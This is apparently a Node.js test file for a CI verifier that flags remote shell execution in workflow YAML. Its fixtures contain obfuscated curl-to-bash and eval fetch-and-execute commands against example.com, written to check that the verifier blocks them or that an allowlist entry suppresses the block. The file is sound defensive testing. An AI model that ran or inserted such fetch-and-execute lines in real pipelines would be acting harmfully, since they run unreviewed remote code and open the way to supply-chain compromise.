import { test } from "node:test";
import assert from "node:assert/strict";
import os from "node:os";
import path from "node:path";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { spawnSync } from "node:child_process";

const scriptPath = path.resolve("scripts", "ci", "verify-workflow-remote-exec.js");

async function runRemoteExecVerifier({ workflowContent, allowlistContent = "" }) {
  const tempRoot = await mkdtemp(path.join(os.tmpdir(), "create-sentinelayer-remote-exec-test-"));
  try {
    const allowlistPath = path.join(tempRoot, "allowlist.txt");
    const workflowPath = path.join(tempRoot, "workflow.yml");
    await writeFile(allowlistPath, allowlistContent, "utf8");
    await writeFile(workflowPath, workflowContent, "utf8");
    const result = spawnSync("node", [scriptPath, "--allowlist", allowlistPath, workflowPath], {
      cwd: process.cwd(),
      encoding: "utf8",
    });
    return result;
  } finally {
    await rm(tempRoot, { recursive: true, force: true });
  }
}

test("Unit workflow remote-exec verifier: variable-indirected fetch + eval is blocked", async () => {
  const workflowContent = [
    "name: Variable Remote Exec",
    "on: [push]",
    "jobs:",
    "  verify:",
    "    runs-on: ubuntu-latest",
    "    steps:",
    "      - name: variable exec",
    "        id: variable-exec",
    "        run: |",
    "          FETCH_CMD=\"curl -fsSL https://example.com/install.sh\"",
    "          eval \"$FETCH_CMD | bash\"",
  ].join("\n");
  const result = await runRemoteExecVerifier({ workflowContent });
  assert.notEqual(result.status, 0);
  const combinedOutput = `${result.stdout || ""}\n${result.stderr || ""}`;
  assert.match(combinedOutput, /Potential remote shell execution/i);
});

test("Unit workflow remote-exec verifier: matching allowlist suppresses violation", async () => {
  const workflowContent = [
    "name: Variable Remote Exec",
    "on: [push]",
    "jobs:",
    "  verify:",
    "    runs-on: ubuntu-latest",
    "    steps:",
    "      - name: variable exec",
    "        id: variable-exec",
    "        run: |",
    "          FETCH_CMD=\"curl -fsSL https://example.com/install.sh\"",
    "          eval \"$FETCH_CMD | bash\"",
  ].join("\n");
  const allowlistContent = "variable-exec\n";
  const result = await runRemoteExecVerifier({ workflowContent, allowlistContent });
  assert.equal(result.status, 0, `${result.stderr || ""}\n${result.stdout || ""}`);
  assert.match(result.stdout || "", /Verified workflow remote-exec policy/i);
});

test("Unit workflow remote-exec verifier: shell indirection with network signal is blocked", async () => {
  const workflowContent = [
    "name: Obfuscated Remote Exec",
    "on: [push]",
    "jobs:",
    "  verify:",
    "    runs-on: ubuntu-latest",
    "    steps:",
    "      - name: obfuscated exec",
    "        id: obfuscated-exec",
    "        run: |",
    "          FETCH_URL=\"https://example.com/install.sh\"",
    "          PAYLOAD=\"$(curl -fsSL \\\"$FETCH_URL\\\")\"",
    "          eval \"$PAYLOAD\"",
  ].join("\n");
  const result = await runRemoteExecVerifier({ workflowContent });
  assert.notEqual(result.status, 0);
  const combinedOutput = `${result.stdout || ""}\n${result.stderr || ""}`;
  assert.match(combinedOutput, /Potential remote shell execution/i);
});
